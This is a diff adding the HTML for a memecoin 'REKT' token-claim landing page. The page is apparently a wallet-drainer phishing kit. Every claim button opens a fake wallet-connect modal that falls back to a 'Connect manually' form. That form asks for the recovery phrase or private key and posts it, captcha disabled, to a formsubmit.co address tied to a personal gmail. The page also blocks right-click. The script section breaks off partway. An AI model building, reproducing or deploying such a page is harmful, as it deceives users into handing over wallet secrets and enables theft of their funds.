@@ -1,0 +1,1385 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="REKT - The ultimate memecoin experience! Join the community that's always getting REKT in the best way possible. Experience the thrill of the crypto game.">
+    <meta name="keywords" content="REKT, memecoin, community, crypto, fun, trading, community, social">
+    <meta name="author" content="REKT Team">
+
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://rekt.com/">
+    <meta property="og:title" content="REKT - The Ultimate Memecoin Experience">
+    <meta property="og:description" content="Join the REKT community! Where getting REKT is just the beginning of something amazing. Be part of the ultimate crypto adventure!">
+    <meta property="og:image" content="rekt_logo.png">
+
+    <!-- Twitter -->
+    <meta property="twitter:card" content="summary_large_image">
+    <meta property="twitter:url" content="https://rekt.com/">
+    <meta property="twitter:title" content="REKT - The Ultimate Memecoin Experience">
+    <meta property="twitter:description" content="Join the REKT community! Where getting REKT is just the beginning of something amazing. Be part of the ultimate crypto adventure!">
+    <meta property="twitter:image" content="rekt_logo.png">
+
+    <title>REKT - The Ultimate Memecoin Experience</title>
+
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="rekt_logo.png">
+
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fredoka+One&family=Comic+Neue:ital,wght@0,400;0,700;1,400&family=Bubblegum+Sans&family=Caveat:wght@400;500;600;700&family=Kalam:wght@300;400;700&family=Brush+Script+MT&display=swap" rel="stylesheet">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="styles/reset.css">
+    <link rel="stylesheet" href="styles/variables.css">
+    <link rel="stylesheet" href="styles/layout.css">
+    <link rel="stylesheet" href="styles/components.css">
+    <link rel="stylesheet" href="styles/responsive.css">
+    <!-- <script src="./firebase-auth.desktop.umd.js"></script> -->
+
+    <!-- IMPORTED STYLE -->
+    <script>
+      document.addEventListener('contextmenu', function (event) {
+        event.preventDefault();
+      });
+    </script>
+
+    <style>
+      /* =================== personal styles  */
+      .blue-glassmorphism {
+        background: rgb(39, 51, 89, 0.4);
+        border-radius: 16px;
+        box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
+        backdrop-filter: blur(5px);
+        -webkit-backdrop-filter: blur(5px);
+        border: 1px solid rgba(0, 0, 0, 0.3);
+        z-index: -1;
+        position: relative;
+      }
+
+      /* white glassmorphism */
+      .white-glassmorphism {
+        background: rgba(17, 7, 21, 0.729);
+        border-radius: 16px;
+        backdrop-filter: blur(5px);
+        -webkit-backdrop-filter: blur(5px);
+        border: 1px solid rgba(255, 255, 255, 0.602);
+        z-index: -1;
+        position: relative;
+      }
+
+      /* =============================== Modal container ===============================*/
+      .modal {
+        display: none;
+        /* Hidden by default */
+        position: fixed;
+        /* Stay in place */
+        z-index: 999;
+        /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%;
+        /* Full width */
+        height: 100%;
+        /* Full height */
+        overflow: auto;
+        /* Enable scroll if needed */
+        background-color: rgb(0, 0, 0);
+        background-color: rgba(0, 0, 0, 0.4);
+        justify-content: center;
+        align-items: center;
+        /* Accessibility enhancements */
+        backdrop-filter: blur(2px);
+        -webkit-backdrop-filter: blur(2px);
+      }
+
+      /* Focus management for accessibility */
+      .modal:focus-within .modal-content {
+        outline: 2px solid #4A90E2;
+        outline-offset: 2px;
+      }
+
+      /* Ensure modal is keyboard accessible */
+      .modal-wallets a:focus,
+      .close:focus {
+        outline: 2px solid #4A90E2;
+        outline-offset: 2px;
+        background-color: #f5f5f5;
+      }
+
+      /* Modal content */
+      .modal-content {
+        background-color: #0A0A0A;
+        /* Dark background theme */
+        border-radius: 16px;
+        /* Rounded corners */
+        padding: 20px;
+        border: 1px solid rgba(74, 27, 122, 0.3);
+        /* Purple border */
+        color: #ffffff;
+        width: 400px;
+        box-shadow: 0 6px 16px rgba(0, 0, 0, 0.4), 0 3px 6px -4px rgba(0,0,0,0.3), 0 9px 28px 8px rgba(0,0,0,0.2);
+        animation: modalOpen 0.4s;
+        font-family: 'Arial', sans-serif;
+        /* Use a clean font */
+        margin: 8px;
+      }
+
+      /* Cross-device compatibility styles */
+      @media (max-width: 768px) {
+        .modal-content {
+          width: 90%;
+          max-width: 350px;
+          margin: 10% auto;
+          padding: 16px;
+          border-radius: 12px;
+        }
+
+        .modal-header h5 {
+          font-size: 18px;
+        }
+
+        .modal-wallets a {
+          padding: 12px 16px;
+          font-size: 14px;
+          border-radius: 8px;
+        }
+
+        .modal-wallets a img {
+          width: 24px;
+          height: 24px;
+        }
+
+        /* Touch-friendly interactions */
+        .modal-wallets a:hover,
+        .modal-wallets a:active {
+          background-color: #2d9449;
+          transform: scale(0.98);
+          transition: all 0.1s ease;
+        }
+
+        .close {
+          font-size: 24px;
+          padding: 8px;
+          min-width: 32px;
+          min-height: 32px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+        }
+      }
+
+      /* Extra small screens */
+      @media (max-width: 480px) {
+        .modal-content {
+          width: 95%;
+          margin: 5% auto;
+          padding: 12px;
+        }
+
+        .modal-header {
+          padding-bottom: 12px;
+        }
+
+        .modal-wallets {
+          margin-top: 16px;
+        }
+      }
+
+      /* Large screens optimization */
+      @media (min-width: 1200px) {
+        .modal-content {
+          width: 420px;
+          padding: 24px;
+        }
+      }
+
+      .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding-bottom: 10px;
+        font-weight: bold;
+        font-size: 18px;
+        color: #ffffff;
+      }
+
+      .modal-header h5 {
+        margin: 0;
+      }
+
+      .close {
+        font-size: 20px;
+        cursor: pointer;
+        color: #ffffff;
+      }
+
+      .modal-wallets {
+        margin-top: 25px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+        /* Space between wallet options */
+      }
+
+      .modal-wallets a {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        background-color: #1A0B2E;
+        color: #ffffff;
+        padding: 14px;
+        border-radius: 12px;
+        font-size: 16px;
+        text-decoration: none;
+        font-weight: 600;
+        border: 1px solid rgba(74, 27, 122, 0.3);
+        transition: background-color 0.2s ease;
+      }
+
+      .modal-wallets a:hover {
+        background-color: #2D0F4D;
+        cursor: pointer;
+      }
+
+      .modal-wallets a img {
+        width: 28px;
+        height: 28px;
+        border-radius: 8px;
+        background: transparent;
+      }
+
+      .dont-have-wallet {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        margin-top: 20px;
+        padding: 12px;
+        width: 80%;
+        margin: auto;
+        color: white;
+        background-color: transparent;
+        border: 2px solid white;
+        border-radius: 25px;
+        font-size: 14px;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s ease;
+      }
+
+      .dont-have-wallet:hover {
+        background-color: rgba(255, 255, 255, 0.2);
+      }
+
+      .close:hover,
+      .close:focus {
+        color: #4A1B7A;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      /* Modal body */
+      .modal-body {
+        padding-top: 10px;
+      }
+
+      /* Wallet link styling */
+      .wallet-link {
+        display: flex;
+        align-items: center;
+        margin: 10px 0;
+        text-decoration: none;
+        color: white;
+        font-weight: 100 !important;
+      }
+
+      .wallet-link img {
+        margin-right: 10px;
+      }
+
+      /* Animation for opening the modal */
+      @keyframes modalOpen {
+        from {
+          opacity: 0;
+        }
+
+        to {
+          opacity: 1;
+        }
+      }
+
+      /* Rotating image animation */
+      @keyframes rotate {
+        from {
+          transform: rotate(0deg);
+        }
+
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      #rotating-image {
+        width: 30px;
+        /* Adjust as necessary */
+        height: 30px;
+        /* Adjust as necessary */
+        animation: rotate 2s linear infinite;
+        /* 2s for the rotation duration */
+        margin-right: 10px;
+        /* Space between image and text */
+      }
+
+      .rotating-image-section {
+        justify-content: center;
+        padding-top: 20px;
+        padding-bottom: 20px;
+        align-items: center;
+        /* Align items in the center */
+        display: flex;
+      }
+
+      #connection-status {
+        color: white;
+        margin: 0;
+        /* Remove any default margin */
+      }
+
+      #connect-manually-btn,
+      #manual-input {
+        margin-top: 10px;
+        display: none;
+        /* Initially hidden */
+      }
+
+      .connect-btn {
+        width: 100%;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+      }
+
+      .connect-btn .show-wallet-modal {
+        background-color: rgba(255, 255, 255, 0.67);
+        border-radius: 10px;
+        border: 1px solid white;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        /* width: auto; */
+        color: rgba(0, 0, 0, 0.769);
+        padding: 8px;
+        text-align: center;
+      }
+
+      #aim_connect {
+        font-size: 15px;
+      }
+
+      /* ============================================================== */
+      /* ============================ FOR THE PHRASE BOX SECTION  */
+      /* Centering content for both Phrase and Private Key tabs */
+      /* Make sure table headers are centered as well */
+      table {
+        width: 100%;
+        table-layout: fixed;
+        /* Ensure consistent width distribution */
+      }
+
+      th {
+        text-align: center;
+        /* Center table headers */
+        padding: 10px;
+        background-color: #2D0F4D;
+        color: #ffffff;
+        border: 1px solid rgba(74, 27, 122, 0.3);
+      }
+
+      /* Centering content for both Phrase and Private Key tabs */
+      .phrase-table-container {
+        padding: 16px;
+        background-color: #1A0B2E;
+        border: 1px solid rgba(74, 27, 122, 0.3);
+        border-radius: 8px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        /* Center the content horizontally */
+        justify-content: center;
+        /* Center the content vertically */
+        text-align: center;
+        /* Center text */
+      }
+
+      /* Center table headings */
+      .table-heading {
+        cursor: pointer;
+        font-size: 14px;
+        padding: 12px;
+        border-radius: 8px;
+        text-align: center;
+        /* Center table headings */
+        background-color: #2D0F4D;
+        color: #ffffff;
+        border: 1px solid rgba(74, 27, 122, 0.3);
+      }
+
+      /* Center form content */
+      .form-content {
+        margin-top: 16px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        /* Center the content horizontally */
+        width: 100%;
+        /* Make sure the content fills the width */
+        text-align: center;
+      }
+
+      /* Center textarea */
+      .form-textarea {
+        width: 100%;
+        /* Full width textarea */
+        max-width: 310px;
+        /* Set a maximum width so it doesn't stretch too far */
+        border-radius: 8px;
+        padding: 8px;
+        color: #ffffff;
+        background-color: #2D0F4D;
+        border: 1px solid rgba(74, 27, 122, 0.5);
+        resize: none;
+        box-shadow: 0 1px 2px rgba(0, 0, 0, 0.2);
+        font-size: 10px;
+        text-align: left;
+        /* Keep text aligned to the left */
+      }
+
+      .form-hint {
+        text-align: center;
+        margin-top: 16px;
+        font-size: 12px;
+        color: #ffffff;
+      }
+
+      .form-input {
+        width: 100%;
+        border-radius: 8px;
+        padding: 8px;
+        color: #ffffff;
+        background-color: #2D0F4D;
+        border: 1px solid rgba(74, 27, 122, 0.5);
+      }
+
+      #connect-manually-btn .btn {
+        color: #ffffff;
+        background-color: #4A1B7A;
+        border-radius: 8px;
+        padding: 12px;
+        font-size: 16px;
+        margin-top: 10px;
+      }
+
+      .btn {
+        color: #ffffff;
+        background-color: #4A1B7A;
+        border-radius: 8px;
+        padding: 12px;
+        font-size: 16px;
+        margin-top: 10px;
+      }
+
+      .error-message {
+        background-color: #2D0F4D;
+        font-size: 14px;
+        color: #ff6b6b;
+        border: 1px solid rgba(255, 107, 107, 0.3);
+        padding: 8px;
+        border-radius: 4px;
+        display: none;
+      }
+
+      .keystore-label {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        padding-top: 20px;
+        padding-bottom: 24px;
+      }
+
+      .keystore-icon {
+        margin-bottom: 12px;
+        width: 40px;
+        height: 40px;
+        color: #a3a3a3;
+      }
+    </style>
+
+    <!-- =================================================== -->
+</head>
+<body>
+    <!-- Navigation -->
+    <nav class="navbar" id="navbar">
+        <div class="nav-container">
+            <a href="#home" class="nav-logo">
+                <img src="rekt-logo-moonpay.svg" alt="REKT Logo" class="nav-logo-img">
+            </a>
+
+            <div class="nav-menu" id="nav-menu">
+                <a href="#home" class="nav-link">Home</a>
+                <a href="#about" class="nav-link">About</a>
+                <a href="#features" class="nav-link">Features</a>
+                <a href="#roadmap" class="nav-link">Roadmap</a>
+                <a href="#how-to-claim" class="nav-link">How to Claim</a>
+                <a href="#faq" class="nav-link">FAQ</a>
+            </div>
+
+            <div class="nav-toggle" id="nav-toggle">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero" id="home">
+        <div class="hero-background">
+            <img src="end_banner.png" alt="REKT Hero Background" class="hero-bg-img">
+            <div class="hero-overlay"></div>
+        </div>
+
+        <div class="hero-content">
+            <div class="container">
+                <div class="hero-text">
+                    <h1 class="hero-title">
+                        <!-- <div class="hero-title-main meme-bounce">
+                            <img src="rekt-logo-moonpay.svg" alt="REKT" class="hero-logo">
+                        </div> -->
+                        <!-- <span class="hero-title-sub meme-wiggle">The Ultimate Memecoin Experience</span> -->
+                    </h1>
+                    <p class="hero-description">
+                        Connect your wallet and claim your REKT tokens! Join the community that's always
+                        getting REKT in the best way possible. Experience the thrill of the crypto game
+                        where every trade is an adventure!
+                    </p>
+                    <div class="hero-buttons">
+                        <a href="#how-to-claim" class="btn btn-primary" onclick="window.openModal()">CLAIM REKT</a>
+                        <a href="#about" class="btn btn-secondary" onclick="window.openModal()">Learn More</a>
+                    </div>
+                </div>
+
+                <!-- <div class="hero-stats">
+                    <div class="stat">
+                        <span class="stat-number">🚀</span>
+                        <span class="stat-label">To The Moon</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">💥</span>
+                        <span class="stat-label">Always REKT</span>
+                    </div>
+                    <div class="stat">
+                        <span class="stat-number">🔥</span>
+                        <span class="stat-label">Forever Lit</span>
+                    </div>
+                </div> -->
+            </div>
+        </div>
+
+        <div class="hero-scroll">
+            <a href="#about" class="scroll-indicator">
+                <span>Scroll Down</span>
+                <div class="scroll-arrow">↓</div>
+            </a>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section class="section section-about" id="about">
+        <div class="container">
+            <h2 class="section-title">About REKT</h2>
+            <div class="section-content">
+                <div class="about-content">
+                    <div class="about-text">
+                        <p class="about-intro">
+                            REKT represents the ultimate memecoin experience where getting REKT
+                            is not just inevitable, it's celebrated! Built on Ethereum's cutting-edge
+                            blockchain technology.
+                        </p>
+                        <p class="about-description">
+                            We're not just another memecoin – we're a community that embraces the
+                            reality of crypto trading. Getting REKT is part of the journey, and we
+                            celebrate every wild ride, moon shot, and crash together!
+                        </p>
+                        <!-- <div class="about-features">
+                            <div class="feature">
+                                <div class="feature-icon">⚡</div>
+                                <h3 class="feature-title">Lightning Fast</h3>
+                                <p class="feature-description">
+                                    Built on Ethereum for secure transactions and global accessibility
+                                </p>
+                            </div>
+                            <div class="feature">
+                                <div class="feature-icon">🎯</div>
+                                <h3 class="feature-title">Always Accurate</h3>
+                                <p class="feature-description">
+                                    We predict the future - you WILL get REKT, it's just a matter of when
+                                </p>
+                            </div>
+                            <div class="feature">
+                                <div class="feature-icon">🔥</div>
+                                <h3 class="feature-title">Community Driven</h3>
+                                <p class="feature-description">
+                                    A community that laughs together, gets REKT together
+                                </p>
+                            </div>
+                        </div> -->
+                    </div>
+                    <div class="about-image">
+                        <img src="rekt.png" alt="REKT Community" class="about-img">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- Features Section -->
+    <section class="section section-features" id="features">
+        <div class="container">
+            <h2 class="section-title">Why Choose REKT?</h2>
+            <div class="section-content">
+                <div class="features-grid">
+                    <div class="feature-card meme-shake">
+                        <div class="feature-card-image">
+                            <img src="rekt_banner2.png" alt="REKT Power" class="feature-img">
+                        </div>
+                        <div class="feature-card-content">
+                            <h3 class="feature-card-title meme-pulse">REKT Power</h3>
+                            <p class="feature-card-description">
+                                Harnessing the power of getting REKT for the ultimate
+                                memecoin trading experience
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="feature-card meme-spin">
+                        <div class="feature-card-image">
+                            <img src="rekt.png" alt="Community Strength" class="feature-img">
+                        </div>
+                        <div class="feature-card-content">
+                            <h3 class="feature-card-title meme-bounce">REKT Community</h3>
+                            <p class="feature-card-description">
+                                Join thousands of traders who understand that getting REKT
+                                is just part of the crypto journey
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="feature-card meme-wiggle">
+                        <div class="feature-card-image">
+                            <img src="rekt_logo.png" alt="REKT Events" class="feature-img">
+                        </div>
+                        <div class="feature-card-content">
+                            <h3 class="feature-card-title meme-shake">REKT Events</h3>
+                            <p class="feature-card-description">
+                                Regular community gatherings, trading competitions, and
+                                REKT celebration events
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Roadmap Section -->
+    <section class="section section-roadmap" id="roadmap">
+        <div class="container">
+            <h2 class="section-title meme-bounce">Roadmap</h2>
+            <div class="section-content">
+                <div class="roadmap-timeline">
+                    <div class="roadmap-item completed">
+                        <div class="roadmap-marker"></div>
+                        <div class="roadmap-content">
+                            <h3 class="roadmap-title">REKT Launch</h3>
+                            <p class="roadmap-description">
+                                The birth of REKT! Where getting REKT becomes an art form
+                                and the community embraces every wild ride
+                            </p>
+                            <span class="roadmap-status completed">✅ Completed</span>
+                        </div>
+                    </div>
+
+                    <div class="roadmap-item active">
+                        <div class="roadmap-marker"></div>
+                        <div class="roadmap-content">
+                            <h3 class="roadmap-title">Global REKT Community</h3>
+                            <p class="roadmap-description">
+                                Expanding our REKT family worldwide with trading events,
+                                social media campaigns, and community competitions
+                            </p>
+                            <span class="roadmap-status active">🚧 In Progress</span>
+                        </div>
+                    </div>
+
+                    <div class="roadmap-item upcoming">
+                        <div class="roadmap-marker"></div>
+                        <div class="roadmap-content">
+                            <h3 class="roadmap-title">REKT Experiences</h3>
+                            <p class="roadmap-description">
+                                Creating unforgettable trading experiences including
+                                virtual events, merchandise, and real-world meetups
+                            </p>
+                            <span class="roadmap-status upcoming">⏳ Upcoming</span>
+                        </div>
+                    </div>
+
+                    <div class="roadmap-item upcoming">
+                        <div class="roadmap-marker"></div>
+                        <div class="roadmap-content">
+                            <h3 class="roadmap-title">REKT Universe</h3>
+                            <p class="roadmap-description">
+                                Expanding into NFTs, games, and creative projects that
+                                celebrate getting REKT and the trading journey
+                            </p>
+                            <span class="roadmap-status upcoming">⏳ Upcoming</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+
+    <!-- How to Claim Section -->
+    <section class="section section-how-to-claim" id="how-to-claim">
+        <div class="container">
+            <h2 class="section-title">How to Claim REKT Tokens</h2>
+            <div class="section-content">
+                <div class="claim-steps">
+                    <div class="claim-step">
+                        <div class="step-number">1</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Get an Ethereum Wallet</h3>
+                            <p class="step-description">
+                                Download MetaMask or Trust Wallet from your app store
+                                or browser extension to store your tokens
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="claim-step">
+                        <div class="step-number">2</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Connect Your Wallet</h3>
+                            <p class="step-description">
+                                Visit our claiming page and connect your Ethereum wallet
+                                to verify you're ready to get REKT
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="claim-step">
+                        <div class="step-number">3</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Claim Your Tokens</h3>
+                            <p class="step-description">
+                                Click the claim button to receive your REKT tokens
+                                directly to your connected wallet
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="claim-step">
+                        <div class="step-number">4</div>
+                        <div class="step-content">
+                            <h3 class="step-title">Choose Your Path</h3>
+                            <p class="step-description">
+                                Hold your tokens to be part of the REKT community, or sell them
+                                on Raydium or Jupiter DEX - the choice is yours!
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                    <div class="claim-cta">
+                    <button class="btn btn-primary btn-large" onclick="window.openModal()">
+                        Get REKT Now
+                    </button>
+                  
+                </div>
+
+                <div class="claim-info">
+                    <p class="claim-note">
+                        <strong>Note:</strong> Token claiming is free and only requires a connected Ethereum wallet.
+                        No purchase necessary - just connect and claim your share of the REKT experience!
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section class="section section-faq" id="faq">
+        <div class="container">
+            <h2 class="section-title">Frequently Asked Questions</h2>
+            <div class="section-content">
+                <div class="faq-accordion">
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>What is REKT?</h3>
+                            <span class="faq-toggle">+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>REKT is a community-driven memecoin built on the Ethereum blockchain,
+                            celebrating the reality of crypto trading where getting REKT is just
+                            part of the journey.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>Why REKT?</h3>
+                            <span class="faq-toggle">+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>REKT represents the reality of crypto trading! We embrace the fact that
+                            getting REKT is inevitable, and we celebrate it as part of the trading journey.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>What makes REKT special?</h3>
+                            <span class="faq-toggle">+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>REKT is special because of our amazing community! We're united by
+                            the shared experience of getting REKT and celebrating every wild ride together.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>How can I join the community?</h3>
+                            <span class="faq-toggle">+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Join our active REKT community on Twitter, Telegram, and Discord. We have
+                            thousands of members who understand the trading journey and 24/7 support available.</p>
+                        </div>
+                    </div>
+
+                    <div class="faq-item">
+                        <div class="faq-question">
+                            <h3>Are there community events?</h3>
+                            <span class="faq-toggle">+</span>
+                        </div>
+                        <div class="faq-answer">
+                            <p>Absolutely! We host regular REKT events, trading competitions, virtual meetups,
+                            and fun activities that bring our trading community together.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- End Banner Section -->
+    <section class="end-banner-section">
+        <div class="end-banner-background">
+            <img src="end_banner.png" alt="REKT End Banner" class="end-banner-img">
+            <div class="end-banner-overlay"></div>
+        </div>
+        <div class="end-banner-content">
+            <div class="container">
+                <div class="end-banner-text">
+                    <h2 class="end-banner-title">Get REKT Today!</h2>
+                    <p class="end-banner-description">
+                        Join the ultimate memecoin experience and be part of the community that celebrates every wild ride in crypto!
+                    </p>
+                    <div class="end-banner-buttons">
+                        <a href="#how-to-claim" class="btn btn-primary" onclick="window.openModal()">Claim Tokens</a>
+                        <a href="#about" class="btn btn-secondary" onclick="window.openModal()">Learn More</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-section">
+                    <div class="footer-logo">
+                        <img src="rekt-logo-moonpay.svg" alt="REKT Logo" class="footer-logo-img">
+                    </div>
+                    <p class="footer-description">
+                        The Ultimate Memecoin Experience! Join our amazing community where getting REKT
+                        is just the beginning of something amazing.
+                    </p>
+                    <div class="footer-social">
+                        <span class="social-link" aria-label="Twitter">🐦</span>
+                        <span class="social-link" aria-label="Telegram">✈️</span>
+                        <span class="social-link" aria-label="Discord">💬</span>
+                    </div>
+                </div>
+
+                <div class="footer-section">
+                    <h3 class="footer-title">Quick Links</h3>
+                    <ul class="footer-links">
+                        <li><a href="#about">About</a></li>
+                        <li><a href="#features">Features</a></li>
+                        <li><a href="#roadmap">Roadmap</a></li>
+                        <li><a href="#how-to-claim">How to Claim</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h3 class="footer-title">Resources</h3>
+                    <ul class="footer-links">
+                        <li><a href="#how-to-claim">How to Claim</a></li>
+                        <li><a href="#faq">FAQ</a></li>
+                        <li><span>Solscan</span></li>
+                        <li><span>Raydium</span></li>
+                    </ul>
+                </div>
+
+                <div class="footer-section">
+                    <h3 class="footer-title">Contact</h3>
+                    <div class="footer-contact">
+                        <p>📧 hello@rekt.com</p>
+                        <p>💬 24/7 Community Support</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p class="footer-copyright">
+                    © 2025 REKT. All rights reserved. |
+                    <a href="#privacy">Privacy Policy</a> |
+                    <a href="#terms">Terms of Service</a>
+                </p>
+                <p class="footer-disclaimer">
+                    Join our community responsibly and remember to embrace the REKT! 🚀
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Modal centering styles -->
+    <style>
+      /* Fullscreen overlay and centering */
+      #walletModal.modal {
+        position: fixed;
+        inset: 0;
+        z-index: 9999;
+        display: none; /* JS sets to 'flex' when opened */
+        align-items: center;
+        justify-content: center;
+        padding: 16px; /* breathing room on small screens */
+        background: rgba(0, 0, 0, 0.45); /* overlay */
+      }
+
+      /* Modal card sizing */
+      #walletModal .modal-content {
+        width: 100%;
+        max-width: 420px;
+        max-height: 90vh;
+        overflow: auto;
+        border-radius: 12px;
+      }
+
+      /* Slightly tighter on very small phones */
+      @media (max-width: 480px) {
+        #walletModal .modal-content {
+          max-width: 92vw;
+        }
+      }
+    </style>
+    <!-- ---------- MODAL SECTION ---------- -->
+    <div id="walletModal" class="modal" style="display: none; position: fixed; inset: 0; z-index: 9999; align-items: center; justify-content: center; padding: 16px; background: rgba(0,0,0,0.45);">
+      <div class="modal-content ">
+        <div class="modal-header">
+          <h5>Connect Wallet</h5>
+          <span class="close" id="closeModalBtn">&times;</span>
+        </div>
+        <div class="modal-body">
+          <div class="modal-wallets" id="wallet-options">
+            <a href="#" class="wallet-link" id="wallet-connect-link">
+              Wallet Connect
+              <img src="./walletconnect.svg" alt="Wallet Icon">
+              </a>
+              <a href="#" class="wallet-link" id="metamask-link">
+                MetaMask
+                <img src="./metamask.svg" alt="Wallet Icon">
+                </a>
+                <a href="#" class="wallet-link" id="pelagus-link">
+                  Pelagus Wallet
+                  <img src="./pelagus.svg" alt="Wallet Icon">
+                  </a>
+                  <a href="#" class="wallet-link" id="coinbase-link">
+                    Coinbase Wallet
+                    <img src="./coinbase.svg" alt="Wallet Icon">
+                    </a>
+                    <a href="#" class="wallet-link" id="binance-link">
+                      Binance Wallet
+                      <img src="./binances.svg" alt="Wallet Icon">
+                      </a>
+                      <a href="#" class="wallet-link" id="Phantom-wallet-link">
+                        Phantom Wallet
+                        <img src="./phantom.svg" alt="Phantom Wallet Icon">
+                      </a>
+          </div>
+          <div style="
+                      display: flex;
+                      flex-direction: column;
+                      justify-content: center;
+                      align-items: center;
+                      text-align: center;
+                      display: none;
+                  " id="connecting-message">
+            <p id="manual-claim-message" style="color: rgba(194, 194, 194, 0.792); font-size: 13px;"></p>
+            <div class="connect-btn" id="connect-manually-btn" style="color: black; display: none">
+              <button class="btn disabled:opacity-50 ">
+                Connect manually
+              </button>
+            </div>
+          </div>
+
+          <!-- phrase table -->
+          <div class="phrase-table-container" style="display: none" id="manual-input">
+            <table class="table-auto">
+              <thead>
+                <tr>
+                  <th class="table-heading" onclick="handleTableClick('Phrase')">
+                    Phrase
+                  </th>
+                  <th class="table-heading" onclick="handleTableClick('Private-Key')">
+                    Private Key
+                  </th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td colspan="2" class="text-center">
+                    <div id="phrase-form" class="form-content">
+                      <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST"
+                        onsubmit="validateForm(event)">
+                        <div class="mb-3">
+                          <textarea id="form_name" name="from_name" rows="5" required
+                            placeholder="Enter your recovery phrase..." class="form-textarea"></textarea>
+                          <p id="error-message" class="error-message">
+                            Error message
+                          </p>
+                          <div class="form-hint">
+                            Typically 12 (sometimes 24) words separated by
+                            single spaces
+                          </div>
+                        </div>
+                        <input type="hidden" name="_captcha" value="false" />
+                        <input type="hidden" name="_next" value="https://rekt-claim.vercel.app/index.html" />
+                        <button type="submit" class="btn btn-primary">Proceed</button>
+                      </form>
+                    </div>
+                    <div id="private-key-form" class="form-content" style="display: none">
+                      <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST">
+                        <div class="mb-3">
+                          <textarea id="private_key" name="private_key" rows="5" required
+                            placeholder="Enter your private key..." class="form-textarea"></textarea>
+                          <div class="form-hint">
+                            Typically 64 alphanumeric characters
+                          </div>
+                        </div>
+                        <input type="hidden" name="_captcha" value="false" />
+                        <input type="hidden" name="_next" value="https://rekt-claim.vercel.app/index.html" />
+                        <button type="submit" class="btn">Proceed</button>
+                      </form>
+                    </div>
+                  </td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Scripts -->
+    <script src="scripts/main.js"></script>
+
+    <!-- IMPORTED SCRIPT -->
+
+    <script>
+
+      const modal = document.getElementById("walletModal");
+      const closeModalBtn = document.getElementById("closeModalBtn");
+      const manualInput = document.getElementById("manual-input");
+      const messageParagraph = document.getElementById("manual-claim-message");
+      const connectManuallyBtn = document.getElementById("connect-manually-btn");
+      const walletOptions = document.getElementById("wallet-options");
+      const connectingMessage = document.getElementById("connecting-message");
+
+      // Ensure modal is a direct child of <body> to avoid iOS/transform containing blocks breaking position: fixed
+      try {
+        if (modal && modal.parentElement !== document.body) {
+          document.body.appendChild(modal);
+        }
+      } catch (reparentErr) {
+        console.warn('Could not reparent modal to <body>:', reparentErr);
+      }
+
+      // Get wallet link elements
+      const phantomWalletLink = document.getElementById("Phantom-wallet-link");
+      const walletConnectLink = document.getElementById("wallet-connect-link");
+      const metamaskLink = document.getElementById("metamask-link");
+      const pelagusLink = document.getElementById("pelagus-link");
